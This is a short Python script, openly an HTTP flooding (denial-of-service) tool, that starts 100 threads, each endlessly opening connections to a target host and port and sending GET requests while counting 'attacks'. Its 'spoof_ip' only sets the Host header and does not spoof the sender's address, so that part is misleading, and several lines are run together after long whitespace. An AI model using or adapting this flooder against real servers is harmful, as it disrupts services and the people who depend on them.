import socket;
import threading;

host = '127.0.0.1';
port = 80;
spoof_ip = '10.181.12.14';

attackers = 100;
attack_count = 0;

def attack():
    while True:                                                                                                               s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
        s.connect((host, port));                                                                                              s.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (host, port));
        s.sendto(("Host: " + spoof_ip + "\r\n\r\n").encode('ascii'), (host, port));                                           global attack_count;
        attack_count += 1;
        print("Attacks: " + str(attack_count));


        s.close();

for i in range(attackers):
    thread = threading.Thread(target=attack);
    thread.start();
